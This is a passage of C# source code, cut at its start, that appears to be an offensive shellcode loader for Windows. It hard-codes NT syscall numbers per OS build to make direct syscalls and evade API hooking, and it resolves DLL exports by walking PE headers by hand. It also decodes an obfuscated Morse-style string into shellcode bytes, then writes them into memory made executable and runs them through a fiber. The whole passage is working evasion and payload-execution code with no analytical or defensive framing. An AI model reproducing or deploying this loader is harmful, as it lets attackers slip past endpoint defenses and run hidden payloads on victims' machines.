                              if (sysType == 2) { syscall[4] = 188; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwWriteVirtualMemory
                              if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwAllocateVirtualMemory
                              if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwCreateSection
                              if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwMapViewOfSection
                              if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwCreateProcess
                              if (sysType == 7) { syscall[4] = 181; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwOpenThread
                              if (sysType == 8) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x129); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                              // ZwResumeThread
                              if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwWaitForSingleObject
                              if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwSetContextThread
                              if (sysType == 11) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x185); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                              // ZwGetContextThread
                              if (sysType == 12) { syscall[4] = 238; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwClose
                              if (sysType == 13) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwOpenProcessToken
                              if (sysType == 14) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x121); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                              // ZwSuspendThread
                              if (sysType == 15) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1B6); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
    													// ZwProtectVirtualMemory
    													if (sysType == 16) { syscall[4] = 81; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
                        } else

                          if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 17763)) // 1809
                          {
                              // ZwOpenProcess
                              if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwCreateThreadEx
                              if (sysType == 2) { syscall[4] = 189; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwWriteVirtualMemory
                              if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwAllocateVirtualMemory
                              if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwCreateSection
                              if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwMapViewOfSection
                              if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwCreateProcess
                              if (sysType == 7) { syscall[4] = 181; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwOpenThread
                              if (sysType == 8) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x129); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                              // ZwResumeThread
                              if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwWaitForSingleObject
                              if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwSetContextThread
                              if (sysType == 11) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x184); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                              // ZwGetContextThread
                              if (sysType == 12) { syscall[4] = 237; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwClose
                              if (sysType == 13) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // ZwOpenProcessToken
                              if (sysType == 14) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x122); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                              // ZwSuspendThread
                              if (sysType == 15) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1B5); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
    													// ZwProtectVirtualMemory
    													if (sysType == 16) { syscall[4] = 81; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
    											} // 1809

                          return syscall;
            }



            public class CustomLoadLibrary
            {
            		/// <summary>
            		/// Resolves LdrLoadDll and uses that function to load a DLL from disk.
            		/// </summary>
            		/// <author>Ruben Boonen (@FuzzySec)</author>
            		/// <param name="DLLPath">The path to the DLL on disk. Uses the LoadLibrary convention.</param>
            		/// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module was not loaded successfully.</returns>
            		public static IntPtr LoadModuleFromDisk(string DLLPath)
            		{
            				UNICODE_STRING uModuleName = new UNICODE_STRING();
            				RtlInitUnicodeString(ref uModuleName, DLLPath);

            				IntPtr hModule = IntPtr.Zero;
            				NTSTATUS CallResult = (NTSTATUS) LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);
            				if (CallResult != NTSTATUS.Success || hModule == IntPtr.Zero)
            				{
            						return IntPtr.Zero;
            				}

            				return hModule;
            		}

            		public static IntPtr GetDllAddress(string DLLName, bool CanLoadFromDisk = false)
            		{
            				IntPtr hModule = GetLoadedModuleAddress(DLLName);
            				if (hModule == IntPtr.Zero && CanLoadFromDisk)
            				{
            						hModule = LoadModuleFromDisk(DLLName);
            						if (hModule == IntPtr.Zero)
            						{
            								throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
            						}
            				}
            				else if (hModule == IntPtr.Zero)
            				{
            						throw new DllNotFoundException(DLLName + ", Dll was not found.");
            				}

            				return hModule;
            		}

            		/// <summary>
            		/// Helper for getting the pointer to a function from a DLL loaded by the process.
            		/// </summary>
            		/// <author>Ruben Boonen (@FuzzySec)</author>
            		/// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll" or "C:\Windows\System32\ntdll.dll").</param>
            		/// <param name="FunctionName">Name of the exported procedure.</param>
            		/// <param name="CanLoadFromDisk">Optional, indicates if the function can try to load the DLL from disk if it is not found in the loaded module list.</param>
            		/// <returns>IntPtr for the desired function.</returns>
            		public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
            		{
            				IntPtr hModule = GetLoadedModuleAddress(DLLName);
            				if (hModule == IntPtr.Zero && CanLoadFromDisk)
            				{
            						hModule = LoadModuleFromDisk(DLLName);
            						if (hModule == IntPtr.Zero)
            						{
            								throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
            						}
            				}
            				else if (hModule == IntPtr.Zero)
            				{
            						throw new DllNotFoundException(DLLName + ", Dll was not found.");
            				}

            				return GetExportAddress(hModule, FunctionName);
            		}

            		/// <summary>
            		/// Helper for getting the base address of a module loaded by the current process. This base address could be passed to GetProcAddress/LdrGetProcedureAddress or it could be used for manual export parsing.
            		/// </summary>
            		/// <author>Ruben Boonen (@FuzzySec)</author>
            		/// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll").</param>
            		/// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module is not found.</returns>
            		public static IntPtr GetLoadedModuleAddress(string DLLName)
            		{
            				ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            				foreach (ProcessModule Mod in ProcModules)
            				{
            						if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
            						{
            								return Mod.BaseAddress;
            						}
            				}

            				return IntPtr.Zero;
            		}
            		/// <summary>
            		/// Given a module base address, resolve the address of a function by manually walking the module export table.
            		/// </summary>
            		/// <author>Ruben Boonen (@FuzzySec)</author>
            		/// <param name="ModuleBase">A pointer to the base address where the module is loaded in the current process.</param>
            		/// <param name="ExportName">The name of the export to search for (e.g. "NtAlertResumeThread").</param>
            		/// <returns>IntPtr for the desired function.</returns>
            		public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
            		{
            				IntPtr FunctionPtr = IntPtr.Zero;
            				try
            				{
            						// Traverse the PE header in memory
            						Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            						Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            						Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            						Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            						Int64 pExport = 0;
            						if (Magic == 0x010b)
            						{
            								pExport = OptHeader + 0x60;
            						}
            						else
            						{
            								pExport = OptHeader + 0x70;
            						}

            						// Read -> IMAGE_EXPORT_DIRECTORY
            						Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            						Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            						Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            						Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            						Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            						Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            						Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            						// Loop the array of export name RVA's
            						for (int i = 0; i < NumberOfNames; i++)
            						{
            								String FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
            								if (FunctionName.ToLower() == ExportName.ToLower())
            								{
            										Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
            										Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
            										FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
            										break;
            								}
            						}
            				}
            				catch
            				{
            						// Catch parser failure
            						throw new InvalidOperationException("Failed to parse module exports.");
            				}

            				if (FunctionPtr == IntPtr.Zero)
            				{
            						// Export not found
            						throw new MissingMethodException(ExportName + ", export not found.");
            				}
            				return FunctionPtr;
            		}
            }


    				public static byte [] Helper(string _P1)
    		    {
    		        byte [] _L1 = new byte [1];
    		        int _N1 = 0;
    		        string _N2 = "";
    		        int _N3 = 0;
    		        int _N4 = 0;
    		        for (int i = 1; i <= _P1.Length; i++) { if (_P1.Substring(_N3, 1) == " ") { _N1++; }
    		            else if (_P1.Substring(_N3, 1) == "|" || _P1.Substring(_N3,1) == "/") { if (_N1 > 0) { _N2 = _N2 + _N1.ToString(); _N1 = 0; } }
    		            else if (_P1.Substring(_N3, 1) == "-") { _N2 = _N2 + "0"; _N1 = 0; }
    		            else if (_P1.Substring(_N3, 1) == "?") { if (_P1.Substring(_N3 - 1, 1) == "?" || _P1.Substring(_N3 - 1, 1) == "-")
    		            {
    		                Array.Resize(ref _L1, _N4 + 1);
    		                _L1[_N4] = Byte.Parse( _N2 );
    		                _N2 = "";
    		                _N1 = 0;
    		                _N4++;
    		            }
    		            else {
    		                Array.Resize(ref _L1, _N4 + 1);
    		                _L1[_N4] = Byte.Parse( _N2 + _N1.ToString() );
    		                _N2 = "";
    		                _N1 = 0;
    		                _N4++;
    		            } }
    		            _N3++;
    		        }
    		        return _L1;
    		    }


    public static void exec()
    {

          string Morse = "-/    /         ?  /-/ ?-/       /  ? /  /         ?  /   /   ?  /  /  ?  /     /     ?  /     /     ?  /     /     ?-/       /  ? /    / ?-/-/     ?  /   /         ?  /     /     ?  /     /     ?  /     /     ?-/       /  ? /        /       ?  / /     ?  / /       ? /         /      ?-/         /     ?-/     /    ?  /-/      ? /   /        ?  /     /  ?-/       /  ?-/    /         ?-/        /        ?-/   /         ?-/       /  ?-/    /     ?  /    /        ?  /     /     ?  /     /     ?  /     /     ?  /  /      ?  /    /    ?-/    /   ? /    /     ?-/       / ? /        /       ? /         /        ?-/   /        ?-/       /    ?  /     /  ?  / /     ?  / /       ? /   /   ?-/ /    ? / /         ? /     /        ?  / /      ? /       /   ? /  /         ? /    /     ?  /    /     ? /    / ?-/        /   ? /   /    ?-/-/ ? /       /    ? /        /   ? /    /     ?-/       /         ?-/ /   ?-/    /      ? /   /    ?-/-/ ? /       /    ?  /    /       ? /    /     ?-/       /         ?-/    /     ? /-/  ? /   /    ? /   /   ?-/       /     ? /     /       ? /    /       ? /   /       ? / /-?  /     /     ? /   /    ? /        /       ?-/      /-? /  /   ?  /  /         ? /      /     ?-/   /     ?-/     /  ?  /  /      ? /       /-? /        /         ?-/  /  ?-/ /      ?  /-/ ?-/   /-?-/     /     ?-/ /     ? /-/    ?-/ /       ? /   /   ? /     /  ? /    /         ?-/  /   ? /        /         ? /     /      ? /       /-? / /         ? /    /         ?  /  /         ? /    /-?-/         /    ?  /   /-?-/      /         ?-/ /-? / /      ?  / /     ?  / /       ? /         /      ?-/  /   ? /       /         ?-/ /    ?  /     /    ? /     /     ? /     /         ?  / /      ?-/  /-?-/ /     ? /        /         ? /   /    ? /    /      ? /        /    ?-/         /  ? /     /   ?  /  /        ?-/  /  ?-/     /     ?-/   /-? /-/     ? /       /-? /     /         ?-/   /        ?-/ /   ?-/   /-? /        /         ?  /     /-?-/-/  ? /        /-?  / /    ?-/ /     ? /   /       ? / /-?  /     /     ? /   /    ? /        /       ?-/      /-? /  /   ? /     /  ?-/-/     ? /     /-?-/     /         ? /    /   ? /   /         ?-/      / ?  /   /         ?-/     /       ? /       /       ? /       /    ? /  /  ?  /-/     ? /         /        ?  / /      ?  /  /   ? /     /      ?  /     /   ? /    /  ?-/      /       ?-/  /  ?  / /-? /        /    ?-/         /  ? /     /   ?  /  /    ?-/  /  ?-/     /     ?-/   /-?  /   /      ? /        /         ?-/         /  ?  / /   ? /    /-?-/  /       ? /        /         ? /    /  ? /     /-? /        / ?  / /    ?-/-/         ? /   /   ?  / /  ?-/     /-?-/       /-? /         /    ?  /     /   ?-/-/       ? /     /  ? /     /      ?-/   /-? / /-? /    /    ?  / / ? /      /      ? /     /-? /  /         ? /   /   ?-/-/      ? / /         ? /    /        ? /         /    ? /  /       ?-/     /         ?  /    /         ? /   /   ?-/ /   ?  /-/ ?-/    /      ?  / /-? /        /         ? /    /  ? /   / ? /    /-?  / /  ?-/   /      ?-/   /         ?  /  / ?-/-/   ?-/    /-?-/   /        ? /     /   ?-/  /   ? /    /-?  /-/       ? /   /        ?  /     /  ?  / /     ?  / /       ? /         /      ?-/         /     ?-/     /    ? /   /    ?-/-/       ? / /   ?  / /    ?  / /      ? /         /      ?-/         /     ? / /         ? / /      ? /        /       ? / /         ? /        /    ?-/         /    ?-/     /         ? /   /        ? /    / ?-/    /      ? /     / ?  / /    ?  /  / ? /     /  ? /  /      ?  /    /         ? /      /   ? / /     ?-/  /   ?-/-/   ?-/-/  ? /    /     ?-/       / ? /     /     ?-/   /-?  /    /  ? /    /-? /  /        ?  /  / ?-/        /         ?-/      /   ? /         / ?-/      /       ?  /-/   ?-/    /         ? /        /       ? /         /      ? /       / ? /       / ?-/     /   ?-/     /    ? /     / ?  /-/   ? / /       ?-/ /   ?-/   /        ?-/ /       ?-/      /-?-/        /       ? /      /  ?  /   /   ?  /     /  ?";

          byte [] sc = Helper(Morse);
          IntPtr scodeSize = (IntPtr)(Int32)((sc.Length));
          IntPtr lpAddress = IntPtr.Zero;
          IntPtr procHandle = (IntPtr)Process.GetCurrentProcess().Handle;

          ZwAllocateVirtualMemory(procHandle, ref lpAddress, new IntPtr(0), ref scodeSize, 0x1000 /*MEM_COMMIT*/ | 0x2000 /*MEM_RESERVE*/, 0x10 /*PROCESS_VM_READ*/ ); // Avoid use PAGE_EXECUTE_READWRITE when allocate memory
          //System.Windows.Forms.MessageBox.Show(lpAddress.ToString());

          UInt32 BytesWritten = 0;
          ZwProtectVirtualMemory(procHandle, ref lpAddress, ref scodeSize, 0x40 /* PAGE_EXECUTE_READWRITE */, ref BytesWritten); // Chage allocated memory to PAGE_EXECUTE_READWRITE

          IntPtr bytesWritten  = IntPtr.Zero;
      		IntPtr uPtr = Marshal.AllocHGlobal(sc.Length);
  				Marshal.Copy(sc, 0, uPtr, sc.Length);
  				ZwWriteVirtualMemory(procHandle, ref lpAddress, uPtr, (UInt32)(scodeSize), ref bytesWritten);
          Marshal.FreeHGlobal(uPtr);

          IntPtr ThreadToFiber = ConvertThreadToFiberR( 0 );
          IntPtr PtrToFiber = CreateFiberR( 0, lpAddress, IntPtr.Zero );
          IntPtr SwitchPtr = SwitchToFiberR(PtrToFiber);
          bool dummy = DeleteFiberR(PtrToFiber);

     }
}



```


